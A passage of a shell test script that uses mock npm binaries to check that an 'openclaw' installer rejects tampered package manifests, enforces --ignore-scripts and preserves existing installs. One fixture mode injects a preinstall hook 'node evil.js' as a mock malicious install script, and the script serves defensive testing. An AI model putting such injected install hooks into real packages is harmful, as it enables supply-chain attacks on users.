cat > "$MOCK_NPM_DIR/bin/npm" <<EOF
#!/bin/sh
echo "\$@" >> "$MOCK_NPM_ARGS"
rc=\$(cat "$MOCK_NPM_EXIT_CODE" 2>/dev/null || echo 0)
if [ "\$rc" -ne 0 ]; then
	exit "\$rc"
fi
case "\$1" in
	pack)
		mkdir -p package/scripts
		cp "$FIXTURE_PKG" package/package.json
		touch package/scripts/preinstall-package-manager-warning.mjs
		touch package/scripts/postinstall-bundled-plugins.mjs
		tar -czf openclaw-2026.9.1.tgz package
		rm -rf package
		echo "openclaw-2026.9.1.tgz"
		exit 0
		;;
	*)
		exit 0
		;;
esac
EOF
chmod +x "$MOCK_NPM_DIR/bin/npm"

HARNESS_INSTALL="$MOCK_NPM_DIR/test-install.sh"
cat > "$HARNESS_INSTALL" <<EOF
#!/bin/sh
set -e
export PATH="$MOCK_NPM_DIR/bin:\$PATH"
NPM_BIN="$MOCK_NPM_DIR/bin/npm"
NODE_BIN="$NODE_BIN"
OC_PACKAGE_CONTRACT="$CONTRACT_JS"
OC_TESTED_VERSION="2026.9.1"
OC_GLOBAL="$MOCK_NPM_DIR/global"
OC_VERSION=""
log_info() { :; }
log_warn() { :; }
log_error() { :; }
ensure_mkdir() { mkdir -p "\$1"; }
find_oc_entry() { echo "$MOCK_INSTALL_PKG_DIR/openclaw.mjs"; }
execute_openclaw_lifecycle() { return 0; }
install_openclaw_cli_wrapper() { return 0; }
assert_node_runtime() { return 0; }
EOF
echo "console.log('2026.9.1');" > "$MOCK_INSTALL_PKG_DIR/openclaw.mjs"
chmod +x "$MOCK_INSTALL_PKG_DIR/openclaw.mjs"
awk '/^validate_openclaw_manifest\(\)/,/^\}$/' "$ENV_SCRIPT" >> "$HARNESS_INSTALL"
awk '/^install_openclaw\(\)/,/^init_openclaw\(\)/' "$ENV_SCRIPT" | sed '$d' >> "$HARNESS_INSTALL"
cat >> "$HARNESS_INSTALL" <<EOF
install_openclaw
EOF

sh "$HARNESS_INSTALL" >/dev/null 2>&1 || fail "install_openclaw should succeed when mock npm succeeds"
grep -q -- "pack.*openclaw@2026\.9\.1" "$MOCK_NPM_ARGS" || fail "install_openclaw must call npm pack for staging"
grep -q -- "--ignore-scripts" "$MOCK_NPM_ARGS" || fail "install_openclaw must pass --ignore-scripts to npm"
grep -q -- "--omit=optional" "$MOCK_NPM_ARGS" || fail "install_openclaw must pass --omit=optional to npm"
grep -E "install -g .*openclaw-2026\.9\.1\.tgz --prefix=" "$MOCK_NPM_ARGS" || fail "install_openclaw must install from the local staged tarball"

# 验证 npm 失败传播
echo "17" > "$MOCK_NPM_EXIT_CODE"
set +e
sh "$HARNESS_INSTALL" >/dev/null 2>&1
RC_NPM_FAIL=$?
set -e
[ "$RC_NPM_FAIL" -eq 17 ] || fail "install_openclaw must propagate npm failure exit code (17)"

# ── 11.2 预检失败时全局安装未执行且已有入口/版本标记未变化 (回滚与状态保持) ──
MOCK_PRESERVE_DIR="$TMP_DIR/mock-preserve-test"
mkdir -p "$MOCK_PRESERVE_DIR/bin"
MOCK_PRESERVE_ARGS="$MOCK_PRESERVE_DIR/npm-args.txt"
MOCK_PACK_TYPE="$MOCK_PRESERVE_DIR/pack-type"
echo "valid" > "$MOCK_PACK_TYPE"

# 建立已存在且可运行的 OpenClaw 安装环境
EXISTING_GLOBAL="$MOCK_PRESERVE_DIR/global"
EXISTING_PKG_DIR="$EXISTING_GLOBAL/lib/node_modules/openclaw"
reset_existing_openclaw() {
	rm -rf "$EXISTING_GLOBAL"
	mkdir -p "$EXISTING_PKG_DIR" "$EXISTING_GLOBAL/bin"
	echo "console.log('2026.9.1-ORIGINAL-ENTRY');" > "$EXISTING_PKG_DIR/openclaw.mjs"
	chmod +x "$EXISTING_PKG_DIR/openclaw.mjs"
	cp "$FIXTURE_PKG" "$EXISTING_PKG_DIR/package.json"
	echo "2026.9.1-ORIGINAL-WRAPPER" > "$EXISTING_GLOBAL/bin/openclaw"
	chmod +x "$EXISTING_GLOBAL/bin/openclaw"
}
reset_existing_openclaw

cat > "$MOCK_PRESERVE_DIR/bin/npm" <<EOF
#!/bin/sh
echo "\$@" >> "$MOCK_PRESERVE_ARGS"
case "\$1" in
	pack)
		pack_mode=\$(cat "$MOCK_PACK_TYPE" 2>/dev/null || echo "valid")
		mkdir -p package/scripts
		cp "$FIXTURE_PKG" package/package.json
		echo "console.log('2026.9.1');" > package/openclaw.mjs
		case "\$pack_mode" in
			"custom-lifecycle")
				"$NODE_BIN" -e '
				const p = JSON.parse(require("fs").readFileSync("package/package.json"));
				p.version = "2026.9.9";
				p.scripts.preinstall = "node evil.js";
				require("fs").writeFileSync("package/package.json", JSON.stringify(p));
				'
				;;
			"custom-empty-lifecycle")
				"$NODE_BIN" -e '
				const p = JSON.parse(require("fs").readFileSync("package/package.json"));
				p.version = "2026.9.9";
				p.scripts = { preinstall: "" };
				p.engines = { node: ">=" + process.versions.node };
				require("fs").writeFileSync("package/package.json", JSON.stringify(p));
				'
				;;
			"incompat-engines")
				"$NODE_BIN" -e '
				const p = JSON.parse(require("fs").readFileSync("package/package.json"));
				p.version = "2026.9.9";
				p.scripts = {};
				p.engines = { node: ">=99.0.0" };
				require("fs").writeFileSync("package/package.json", JSON.stringify(p));
				'
				;;
			"bad-engines")
				"$NODE_BIN" -e '
				const p = JSON.parse(require("fs").readFileSync("package/package.json"));
				p.version = "2026.9.9";
				p.scripts = {};
				p.engines = { node: "^^22.0.0" };
				require("fs").writeFileSync("package/package.json", JSON.stringify(p));
				'
				;;
			"ver-mismatch")
				"$NODE_BIN" -e '
				const p = JSON.parse(require("fs").readFileSync("package/package.json"));
				p.version = "2026.9.8";
				p.scripts = {};
				p.engines = { node: ">=" + process.versions.node };
				require("fs").writeFileSync("package/package.json", JSON.stringify(p));
				'
				;;
			"missing-field")
				"$NODE_BIN" -e '
				const p = JSON.parse(require("fs").readFileSync("package/package.json"));
				delete p.name;
				require("fs").writeFileSync("package/package.json", JSON.stringify(p));
				'
				;;
			"type-error")
				"$NODE_BIN" -e '
				const p = JSON.parse(require("fs").readFileSync("package/package.json"));
				p.bin = "openclaw.mjs";
				require("fs").writeFileSync("package/package.json", JSON.stringify(p));
				'
				;;
			"val-drift")
				"$NODE_BIN" -e '
				const p = JSON.parse(require("fs").readFileSync("package/package.json"));
				p.name = "openclaw-drift";
				require("fs").writeFileSync("package/package.json", JSON.stringify(p));
				'
				;;
			"struct-drift")
				"$NODE_BIN" -e '
				const p = JSON.parse(require("fs").readFileSync("package/package.json"));
				p.bin.extra = "extra.mjs";
				require("fs").writeFileSync("package/package.json", JSON.stringify(p));
				'
				;;
			"empty-lifecycle")
				"$NODE_BIN" -e '
				const p = JSON.parse(require("fs").readFileSync("package/package.json"));
				p.scripts.install = "";
				require("fs").writeFileSync("package/package.json", JSON.stringify(p));
				'
				;;
			"valid-custom")
				echo "console.log('2026.9.9');" > package/openclaw.mjs
				"$NODE_BIN" -e '
				const p = JSON.parse(require("fs").readFileSync("package/package.json"));
				p.version = "2026.9.9";
				p.scripts = {};
				p.engines = { node: ">=" + process.versions.node };
				require("fs").writeFileSync("package/package.json", JSON.stringify(p));
				'
				;;
			*)
				touch package/scripts/preinstall-package-manager-warning.mjs
				touch package/scripts/postinstall-bundled-plugins.mjs
				;;
		esac
		tar -czf openclaw-staged.tgz package
		rm -rf package
		echo "openclaw-staged.tgz"
		exit 0
		;;
	install)
		tarball_arg=""
		dest_prefix="$EXISTING_GLOBAL"
		for arg in "\$@"; do
			case "\$arg" in
				*.tgz) tarball_arg="\$arg" ;;
				--prefix=*) dest_prefix="\${arg#--prefix=}" ;;
			esac
		done
		if [ -n "\$tarball_arg" ] && [ -f "\$tarball_arg" ]; then
			target_mod_dir="\$dest_prefix/lib/node_modules/openclaw"
			mkdir -p "\$target_mod_dir"
			tar -xzf "\$tarball_arg" -C "\$target_mod_dir" --strip-components=1 2>/dev/null || true
		fi
		exit 0
		;;
	*)
		exit 0
		;;
esac
EOF
chmod +x "$MOCK_PRESERVE_DIR/bin/npm"

assert_state_preserved() {
	local label="$1" rc="$2"
	[ "$rc" -ne 0 ] || fail "${label}: command must exit non-zero on precheck failure"
	grep -q -- "install -g" "$MOCK_PRESERVE_ARGS" && fail "${label}: npm install -g must NOT be called when precheck fails"
	grep -q "2026.9.1-ORIGINAL-ENTRY" "$EXISTING_PKG_DIR/openclaw.mjs" || fail "${label}: existing openclaw.mjs was modified after failed precheck"
	grep -q '"version": "2026.9.1"' "$EXISTING_PKG_DIR/package.json" || fail "${label}: existing package.json was modified after failed precheck"
	grep -q "2026.9.1-ORIGINAL-WRAPPER" "$EXISTING_GLOBAL/bin/openclaw" || fail "${label}: existing wrapper was modified after failed precheck"
}

HARNESS_PRESERVE="$MOCK_PRESERVE_DIR/test-preserve.sh"
cat > "$HARNESS_PRESERVE" <<EOF
#!/bin/sh
set -e
export PATH="$MOCK_PRESERVE_DIR/bin:\$PATH"
NPM_BIN="$MOCK_PRESERVE_DIR/bin/npm"
NODE_BIN="$NODE_BIN"
OC_PACKAGE_CONTRACT="$CONTRACT_JS"
OC_TESTED_VERSION="2026.9.1"
OC_GLOBAL="$EXISTING_GLOBAL"
OC_VERSION="\${OC_VERSION:-}"
log_info() { :; }
log_warn() { :; }
log_error() { :; }
ensure_mkdir() { mkdir -p "\$1"; }
find_oc_entry() {
	local base="\${1:-$EXISTING_GLOBAL}"
	if [ -f "\$base/lib/node_modules/openclaw/openclaw.mjs" ]; then
		echo "\$base/lib/node_modules/openclaw/openclaw.mjs"
	elif [ -f "$EXISTING_PKG_DIR/openclaw.mjs" ]; then
		echo "$EXISTING_PKG_DIR/openclaw.mjs"
	fi
}
install_openclaw_cli_wrapper() { return 0; }
assert_node_runtime() { return 0; }
cleanup_partial_install() { :; }
EOF
awk '/^validate_openclaw_manifest\(\)/,/^\}$/' "$ENV_SCRIPT" >> "$HARNESS_PRESERVE"
awk '/^execute_openclaw_lifecycle\(\)/,/^\}$/' "$ENV_SCRIPT" >> "$HARNESS_PRESERVE"
awk '/^install_openclaw\(\)/,/^init_openclaw\(\)/' "$ENV_SCRIPT" | sed '$d' >> "$HARNESS_PRESERVE"
cat >> "$HARNESS_PRESERVE" <<EOF
install_openclaw
EOF

# ── 11.2 install_openclaw 预检拦截与状态保持测试 ──
# (11.2a) 关键字段缺失拒绝: 全局安装未执行，已有入口及版本不变
echo "missing-field" > "$MOCK_PACK_TYPE"
rm -f "$MOCK_PRESERVE_ARGS"
set +e
sh "$HARNESS_PRESERVE" >/dev/null 2>&1
RC_REJECT_MISSING=$?
set -e
assert_state_preserved "install_openclaw missing-field" "$RC_REJECT_MISSING"

# (11.2b) 字段类型错误拒绝: 全局安装未执行，已有入口及版本不变
echo "type-error" > "$MOCK_PACK_TYPE"
rm -f "$MOCK_PRESERVE_ARGS"
set +e
sh "$HARNESS_PRESERVE" >/dev/null 2>&1
RC_REJECT_TYPE=$?
set -e
assert_state_preserved "install_openclaw type-error" "$RC_REJECT_TYPE"

# (11.2c) 字段值漂移拒绝: 全局安装未执行，已有入口及版本不变
echo "val-drift" > "$MOCK_PACK_TYPE"
rm -f "$MOCK_PRESERVE_ARGS"
set +e
sh "$HARNESS_PRESERVE" >/dev/null 2>&1
RC_REJECT_VAL=$?
set -e
assert_state_preserved "install_openclaw val-drift" "$RC_REJECT_VAL"

# (11.2d) 结构漂移 / 额外或空值 lifecycle 拒绝: 全局安装未执行，已有安装不变
echo "struct-drift" > "$MOCK_PACK_TYPE"
rm -f "$MOCK_PRESERVE_ARGS"
set +e
sh "$HARNESS_PRESERVE" >/dev/null 2>&1
RC_REJECT_STRUCT=$?
set -e
assert_state_preserved "install_openclaw struct-drift" "$RC_REJECT_STRUCT"

echo "empty-lifecycle" > "$MOCK_PACK_TYPE"
rm -f "$MOCK_PRESERVE_ARGS"
set +e
sh "$HARNESS_PRESERVE" >/dev/null 2>&1
RC_REJECT_EMPTY_LC=$?
set -e
assert_state_preserved "install_openclaw empty-lifecycle" "$RC_REJECT_EMPTY_LC"

# (11.2e) latest/自定义版本含未知 lifecycle 拒绝: 全局安装未执行，已有安装不变
echo "custom-lifecycle" > "$MOCK_PACK_TYPE"
rm -f "$MOCK_PRESERVE_ARGS"
set +e
OC_VERSION="2026.9.9" sh "$HARNESS_PRESERVE" >/dev/null 2>&1
RC_REJECT_LIFECYCLE=$?
set -e
assert_state_preserved "install_openclaw custom-lifecycle" "$RC_REJECT_LIFECYCLE"

echo "custom-empty-lifecycle" > "$MOCK_PACK_TYPE"
rm -f "$MOCK_PRESERVE_ARGS"
set +e
OC_VERSION="2026.9.9" sh "$HARNESS_PRESERVE" >/dev/null 2>&1
RC_REJECT_CUSTOM_EMPTY_LC=$?
set -e
assert_state_preserved "install_openclaw custom-empty-lifecycle" "$RC_REJECT_CUSTOM_EMPTY_LC"

# (11.2f) latest/自定义版本版本不一致拒绝: 全局安装未执行，已有安装不变
echo "ver-mismatch" > "$MOCK_PACK_TYPE"
rm -f "$MOCK_PRESERVE_ARGS"
set +e
OC_VERSION="2026.9.9" sh "$HARNESS_PRESERVE" >/dev/null 2>&1
RC_REJECT_VER_MISMATCH=$?
set -e
assert_state_preserved "install_openclaw ver-mismatch" "$RC_REJECT_VER_MISMATCH"

# (11.2g) latest/自定义版本非法 engines.node 拒绝: 全局安装未执行，已有安装不变
echo "bad-engines" > "$MOCK_PACK_TYPE"
rm -f "$MOCK_PRESERVE_ARGS"
set +e
OC_VERSION="2026.9.9" sh "$HARNESS_PRESERVE" >/dev/null 2>&1
RC_REJECT_BAD_ENGINES=$?
set -e
assert_state_preserved "install_openclaw bad-engines" "$RC_REJECT_BAD_ENGINES"

# (11.2h) latest/自定义版本 engines.node 不兼容拒绝: 全局安装未执行，已有安装不变
echo "incompat-engines" > "$MOCK_PACK_TYPE"
rm -f "$MOCK_PRESERVE_ARGS"
set +e
OC_VERSION="2026.9.9" sh "$HARNESS_PRESERVE" >/dev/null 2>&1
RC_REJECT_ENGINES=$?
set -e
assert_state_preserved "install_openclaw incompat-engines" "$RC_REJECT_ENGINES"

# (11.2i) 通过预检后安装使用同一个本地 tarball 产物
echo "valid-custom" > "$MOCK_PACK_TYPE"
rm -f "$MOCK_PRESERVE_ARGS"
OC_VERSION="2026.9.9" sh "$HARNESS_PRESERVE" || fail "valid custom version should pass precheck and install"
grep -q -- "pack openclaw@2026.9.9" "$MOCK_PRESERVE_ARGS" || fail "npm pack was not called with target package"
grep -E "install -g .*openclaw-staged\.tgz --prefix=" "$MOCK_PRESERVE_ARGS" || fail "install_openclaw must install from the local staged tarball"
grep -q -- "--ignore-scripts" "$MOCK_PRESERVE_ARGS" || fail "install_openclaw must enforce --ignore-scripts"
grep -q -- "--omit=optional" "$MOCK_PRESERVE_ARGS" || fail "install_openclaw must enforce --omit=optional"

# ── 11.3 upgrade_openclaw 预检拦截与状态保持测试 ──
reset_existing_openclaw
HARNESS_UPGRADE_PRESERVE="$MOCK_PRESERVE_DIR/test-upgrade-preserve.sh"
cat > "$HARNESS_UPGRADE_PRESERVE" <<EOF
#!/bin/sh
set -e
export PATH="$MOCK_PRESERVE_DIR/bin:\$PATH"
NPM_BIN="$MOCK_PRESERVE_DIR/bin/npm"
NODE_BIN="$NODE_BIN"
OC_PACKAGE_CONTRACT="$CONTRACT_JS"
OC_TESTED_VERSION="2026.9.1"
OC_GLOBAL="$EXISTING_GLOBAL"
OC_VERSION="\${OC_VERSION:-}"
log_info() { :; }
log_warn() { :; }
log_error() { :; }
ensure_mkdir() { mkdir -p "\$1"; }
find_oc_entry() {
	local base="\${1:-$EXISTING_GLOBAL}"
	if [ -f "\$base/lib/node_modules/openclaw/openclaw.mjs" ]; then
		echo "\$base/lib/node_modules/openclaw/openclaw.mjs"
	elif [ -f "$EXISTING_PKG_DIR/openclaw.mjs" ]; then
		echo "$EXISTING_PKG_DIR/openclaw.mjs"
	fi
}
install_openclaw_cli_wrapper() { return 0; }
assert_node_runtime() { return 0; }
cleanup_partial_install() { :; }
EOF
awk '/^validate_openclaw_manifest\(\)/,/^\}$/' "$ENV_SCRIPT" >> "$HARNESS_UPGRADE_PRESERVE"
awk '/^execute_openclaw_lifecycle\(\)/,/^\}$/' "$ENV_SCRIPT" >> "$HARNESS_UPGRADE_PRESERVE"
awk '/^upgrade_openclaw\(\)/,/^do_upgrade\(\)/' "$ENV_SCRIPT" | sed '$d' >> "$HARNESS_UPGRADE_PRESERVE"
cat >> "$HARNESS_UPGRADE_PRESERVE" <<EOF
upgrade_openclaw
EOF

# (11.3a) 关键字段缺失拒绝: 全局安装未执行，已有入口及版本不变
echo "missing-field" > "$MOCK_PACK_TYPE"
rm -f "$MOCK_PRESERVE_ARGS"
set +e
sh "$HARNESS_UPGRADE_PRESERVE" >/dev/null 2>&1
RC_UP_MISSING=$?
set -e
assert_state_preserved "upgrade_openclaw missing-field" "$RC_UP_MISSING"

# (11.3b) 字段类型错误拒绝: 全局安装未执行，已有入口及版本不变
echo "type-error" > "$MOCK_PACK_TYPE"
rm -f "$MOCK_PRESERVE_ARGS"
set +e
sh "$HARNESS_UPGRADE_PRESERVE" >/dev/null 2>&1
RC_UP_TYPE=$?
set -e
assert_state_preserved "upgrade_openclaw type-error" "$RC_UP_TYPE"

# (11.3c) 字段值漂移拒绝: 全局安装未执行，已有入口及版本不变
echo "val-drift" > "$MOCK_PACK_TYPE"
rm -f "$MOCK_PRESERVE_ARGS"
set +e
sh "$HARNESS_UPGRADE_PRESERVE" >/dev/null 2>&1
RC_UP_VAL=$?
set -e
assert_state_preserved "upgrade_openclaw val-drift" "$RC_UP_VAL"

# (11.3d) 结构漂移 / 额外或空值 lifecycle 拒绝: 全局安装未执行，已有安装不变
echo "struct-drift" > "$MOCK_PACK_TYPE"
rm -f "$MOCK_PRESERVE_ARGS"
set +e
sh "$HARNESS_UPGRADE_PRESERVE" >/dev/null 2>&1
RC_UP_STRUCT=$?
set -e
assert_state_preserved "upgrade_openclaw struct-drift" "$RC_UP_STRUCT"

echo "empty-lifecycle" > "$MOCK_PACK_TYPE"
rm -f "$MOCK_PRESERVE_ARGS"
set +e
sh "$HARNESS_UPGRADE_PRESERVE" >/dev/null 2>&1
RC_UP_EMPTY_LC=$?
set -e
assert_state_preserved "upgrade_openclaw empty-lifecycle" "$RC_UP_EMPTY_LC"

# (11.3e) latest/自定义版本含未知 lifecycle 拒绝: 全局安装未执行，已有安装不变
echo "custom-lifecycle" > "$MOCK_PACK_TYPE"
rm -f "$MOCK_PRESERVE_ARGS"
set +e
OC_VERSION="2026.9.9" sh "$HARNESS_UPGRADE_PRESERVE" >/dev/null 2>&1
RC_UP_LIFECYCLE=$?
set -e
assert_state_preserved "upgrade_openclaw custom-lifecycle" "$RC_UP_LIFECYCLE"

echo "custom-empty-lifecycle" > "$MOCK_PACK_TYPE"
rm -f "$MOCK_PRESERVE_ARGS"
set +e
OC_VERSION="2026.9.9" sh "$HARNESS_UPGRADE_PRESERVE" >/dev/null 2>&1
RC_UP_CUSTOM_EMPTY_LC=$?
set -e
assert_state_preserved "upgrade_openclaw custom-empty-lifecycle" "$RC_UP_CUSTOM_EMPTY_LC"

# (11.3f) latest/自定义版本版本不一致拒绝: 全局安装未执行，已有安装不变
echo "ver-mismatch" > "$MOCK_PACK_TYPE"
rm -f "$MOCK_PRESERVE_ARGS"
set +e
OC_VERSION="2026.9.9" sh "$HARNESS_UPGRADE_PRESERVE" >/dev/null 2>&1
RC_UP_VER_MISMATCH=$?
set -e
assert_state_preserved "upgrade_openclaw ver-mismatch" "$RC_UP_VER_MISMATCH"

# (11.3g) latest/自定义版本非法 engines.node 拒绝: 全局安装未执行，已有安装不变
echo "bad-engines" > "$MOCK_PACK_TYPE"
rm -f "$MOCK_PRESERVE_ARGS"
set +e
OC_VERSION="2026.9.9" sh "$HARNESS_UPGRADE_PRESERVE" >/dev/null 2>&1
RC_UP_BAD_ENGINES=$?
set -e
assert_state_preserved "upgrade_openclaw bad-engines" "$RC_UP_BAD_ENGINES"

# (11.3h) latest/自定义版本 engines.node 不兼容拒绝: 全局安装未执行，已有安装不变
echo "incompat-engines" > "$MOCK_PACK_TYPE"
rm -f "$MOCK_PRESERVE_ARGS"
set +e
OC_VERSION="2026.9.9" sh "$HARNESS_UPGRADE_PRESERVE" >/dev/null 2>&1
RC_UP_ENGINES=$?
set -e
assert_state_preserved "upgrade_openclaw incompat-engines" "$RC_UP_ENGINES"

# (11.3i) 通过预检后升级使用同一个本地 tarball 产物
echo "valid-custom" > "$MOCK_PACK_TYPE"
rm -f "$MOCK_PRESERVE_ARGS"
OC_VERSION="2026.9.9" sh "$HARNESS_UPGRADE_PRESERVE" || fail "valid custom version should pass precheck and upgrade"
grep -q -- "pack openclaw@2026.9.9" "$MOCK_PRESERVE_ARGS" || fail "npm pack was not called with target package"
grep -E "install -g .*openclaw-staged\.tgz --prefix=" "$MOCK_PRESERVE_ARGS" || fail "upgrade_openclaw must install from the local staged tarball"
grep -q -- "--ignore-scripts" "$MOCK_PRESERVE_ARGS" || fail "upgrade_openclaw must enforce --ignore-scripts"
grep -q -- "--omit=optional" "$MOCK_PRESERVE_ARGS" || fail "upgrade_openclaw must enforce --omit=optional"

# ── 12. 构建脚本与发布工作流版本与架构一致性 ──
grep -q 'NODE_VERSION_V2="22.23.2"' "$ENV_SCRIPT" || fail "NODE_VERSION_V2 must be pinned to 22.23.2"
grep -q 'OC_TESTED_VERSION="2026.9.1"' "$ENV_SCRIPT" || fail "OC_TESTED_VERSION must be pinned to 2026.9.1"
grep -q 'node-v22.23.2-linux-arm64-musl.tar.xz' "$WORKFLOW" || fail "workflow must produce node-v22.23.2-linux-arm64-musl.tar.xz"
grep -Fq 'Actual Alpine Node.js version (${ACTUAL_VER}) does not match requested version (${NODE_VER})' "$BUILD_SCRIPT" || fail "build script must reject Alpine apk version mismatch"
grep -Fq 'cross mode (glibc binary with patched ELF interpreter) is forbidden' "$BUILD_SCRIPT" || fail "build script must forbid fake glibc cross mode"

# ── 13. lifecycle 副作用与依赖解析契约测试 (预检零执行、正式安装/升级恰好一次、失败回滚与状态保持) ──
FIXTURE_PREINSTALL="$REPO_ROOT/tests/fixtures/lifecycle-side-effect/scripts/preinstall-package-manager-warning.mjs"
FIXTURE_POSTINSTALL="$REPO_ROOT/tests/fixtures/lifecycle-side-effect/scripts/postinstall-bundled-plugins.mjs"
[ -f "$FIXTURE_PREINSTALL" ] || fail "missing fixture preinstall script"
[ -f "$FIXTURE_POSTINSTALL" ] || fail "missing fixture postinstall script"

MOCK_SE_DIR="$TMP_DIR/mock-side-effect-test"
mkdir -p "$MOCK_SE_DIR/bin"
MOCK_SE_LOG="$MOCK_SE_DIR/lifecycle-side-effects.log"
MOCK_SE_GLOBAL="$MOCK_SE_DIR/global"
MOCK_SE_ARGS="$MOCK_SE_DIR/npm-args.txt"

cat > "$MOCK_SE_DIR/bin/npm" <<EOF
#!/bin/sh
echo "\$@" >> "$MOCK_SE_ARGS"
case "\$1" in
	pack)
		pkg_name="openclaw-2026.9.1.tgz"
		build_pkg_dir="\$PWD/package"
		rm -rf "\$build_pkg_dir"
		mkdir -p "\$build_pkg_dir/scripts" "\$build_pkg_dir/node_modules/mock-contract-dep"
		cp "$FIXTURE_PKG" "\$build_pkg_dir/package.json"
		echo "console.log('2026.9.1');" > "\$build_pkg_dir/openclaw.mjs"
		cp "$FIXTURE_PREINSTALL" "\$build_pkg_dir/scripts/preinstall-package-manager-warning.mjs"
		cp "$FIXTURE_POSTINSTALL" "\$build_pkg_dir/scripts/postinstall-bundled-plugins.mjs"
		echo "module.exports = { resolved: true };" > "\$build_pkg_dir/node_modules/mock-contract-dep/index.js"
		tar -czf "\$pkg_name" package
		rm -rf "\$build_pkg_dir"
		echo "\$pkg_name"
		exit 0
		;;
	install)
		tarball_arg=""
		dest_prefix=""
		for arg in "\$@"; do
			case "\$arg" in
				*.tgz) tarball_arg="\$arg" ;;
				--prefix=*) dest_prefix="\${arg#--prefix=}" ;;
			esac
		done
		if [ -n "\$tarball_arg" ] && [ -f "\$tarball_arg" ] && [ -n "\$dest_prefix" ]; then
			target_mod_dir="\$dest_prefix/lib/node_modules/openclaw"
			mkdir -p "\$target_mod_dir" "\$dest_prefix/bin"
			tar -xzf "\$tarball_arg" -C "\$target_mod_dir" --strip-components=1 2>/dev/null || true
			echo "console.log('2026.9.1');" > "\$target_mod_dir/openclaw.mjs"
			chmod +x "\$target_mod_dir/openclaw.mjs"
		fi
		exit 0
		;;
	*)
		exit 0
		;;
esac
EOF
chmod +x "$MOCK_SE_DIR/bin/npm"

reset_se_global() {
	rm -rf "$MOCK_SE_GLOBAL" "$MOCK_SE_DIR/.global-"*
	mkdir -p "$MOCK_SE_GLOBAL/lib/node_modules/openclaw" "$MOCK_SE_GLOBAL/bin"
	echo "console.log('2026.9.0-ORIGINAL-ENTRY');" > "$MOCK_SE_GLOBAL/lib/node_modules/openclaw/openclaw.mjs"
	chmod +x "$MOCK_SE_GLOBAL/lib/node_modules/openclaw/openclaw.mjs"
	"$NODE_BIN" -e '
	const p = JSON.parse(require("fs").readFileSync(process.argv[1], "utf8"));
	p.version = "2026.9.0";
	require("fs").writeFileSync(process.argv[2], JSON.stringify(p, null, 2));
	' "$FIXTURE_PKG" "$MOCK_SE_GLOBAL/lib/node_modules/openclaw/package.json"
	echo "2026.9.0-ORIGINAL-WRAPPER" > "$MOCK_SE_GLOBAL/bin/openclaw"
	chmod +x "$MOCK_SE_GLOBAL/bin/openclaw"
}

HARNESS_SE_INSTALL="$MOCK_SE_DIR/test-se-install.sh"
cat > "$HARNESS_SE_INSTALL" <<EOF
#!/bin/sh
set -e
export PATH="$MOCK_SE_DIR/bin:\$PATH"
export OC_SIDE_EFFECT_FILE="$MOCK_SE_LOG"
export OC_TEST_DEP="mock-contract-dep"
export OC_FAIL_PREINSTALL="\${OC_FAIL_PREINSTALL:-0}"
export OC_FAIL_POSTINSTALL="\${OC_FAIL_POSTINSTALL:-0}"
NPM_BIN="$MOCK_SE_DIR/bin/npm"
NODE_BIN="$NODE_BIN"
OC_PACKAGE_CONTRACT="$CONTRACT_JS"
OC_TESTED_VERSION="2026.9.1"
OC_GLOBAL="$MOCK_SE_GLOBAL"
OC_VERSION="2026.9.1"
OC_SETUP_CLEANUP=0
log_info() { :; }
log_warn() { :; }
log_error() { :; }
ensure_mkdir() { mkdir -p "\$1"; }
find_oc_entry() {
	local base="\${1:-$MOCK_SE_GLOBAL}"
	if [ -f "\$base/lib/node_modules/openclaw/openclaw.mjs" ]; then
		echo "\$base/lib/node_modules/openclaw/openclaw.mjs"
	fi
}
install_openclaw_cli_wrapper() {
	local base="\${1:-$MOCK_SE_GLOBAL}"
	mkdir -p "\$base/bin"
	rm -f "\$base/bin/openclaw" 2>/dev/null || true
	echo "2026.9.1-NEW-WRAPPER" > "\$base/bin/openclaw"
	chmod +x "\$base/bin/openclaw"
	return 0
}
assert_node_runtime() { return 0; }
cleanup_partial_install() { :; }
EOF
awk '/^validate_openclaw_manifest\(\)/,/^\}$/' "$ENV_SCRIPT" >> "$HARNESS_SE_INSTALL"
awk '/^execute_openclaw_lifecycle\(\)/,/^\}$/' "$ENV_SCRIPT" >> "$HARNESS_SE_INSTALL"
awk '/^install_openclaw\(\)/,/^init_openclaw\(\)/' "$ENV_SCRIPT" | sed '$d' >> "$HARNESS_SE_INSTALL"
cat >> "$HARNESS_SE_INSTALL" <<EOF
install_openclaw
EOF

HARNESS_SE_UPGRADE="$MOCK_SE_DIR/test-se-upgrade.sh"
cat > "$HARNESS_SE_UPGRADE" <<EOF
#!/bin/sh
set -e
export PATH="$MOCK_SE_DIR/bin:\$PATH"
export OC_SIDE_EFFECT_FILE="$MOCK_SE_LOG"
export OC_TEST_DEP="mock-contract-dep"
export OC_FAIL_PREINSTALL="\${OC_FAIL_PREINSTALL:-0}"
export OC_FAIL_POSTINSTALL="\${OC_FAIL_POSTINSTALL:-0}"
NPM_BIN="$MOCK_SE_DIR/bin/npm"
NODE_BIN="$NODE_BIN"
OC_PACKAGE_CONTRACT="$CONTRACT_JS"
OC_TESTED_VERSION="2026.9.1"
OC_GLOBAL="$MOCK_SE_GLOBAL"
OC_VERSION="2026.9.1"
log_info() { :; }
log_warn() { :; }
log_error() { :; }
ensure_mkdir() { mkdir -p "\$1"; }
find_oc_entry() {
	local base="\${1:-$MOCK_SE_GLOBAL}"
	if [ -f "\$base/lib/node_modules/openclaw/openclaw.mjs" ]; then
		echo "\$base/lib/node_modules/openclaw/openclaw.mjs"
	fi
}
install_openclaw_cli_wrapper() {
	local base="\${1:-$MOCK_SE_GLOBAL}"
	mkdir -p "\$base/bin"
	rm -f "\$base/bin/openclaw" 2>/dev/null || true
	echo "2026.9.1-NEW-WRAPPER" > "\$base/bin/openclaw"
	chmod +x "\$base/bin/openclaw"
	return 0
}
assert_node_runtime() { return 0; }
cleanup_partial_install() { :; }
EOF
awk '/^validate_openclaw_manifest\(\)/,/^\}$/' "$ENV_SCRIPT" >> "$HARNESS_SE_UPGRADE"
awk '/^execute_openclaw_lifecycle\(\)/,/^\}$/' "$ENV_SCRIPT" >> "$HARNESS_SE_UPGRADE"
awk '/^upgrade_openclaw\(\)/,/^do_upgrade\(\)/' "$ENV_SCRIPT" | sed '$d' >> "$HARNESS_SE_UPGRADE"
cat >> "$HARNESS_SE_UPGRADE" <<EOF
upgrade_openclaw
EOF

# ── 13.1 静态预检零执行验证 ──
# validate_openclaw_manifest 静态校验解包产物时不得产生任何文件写入副作用 (零执行)
SE_PRECHECK_DIR="$MOCK_SE_DIR/precheck-fixture"
mkdir -p "$SE_PRECHECK_DIR/scripts"
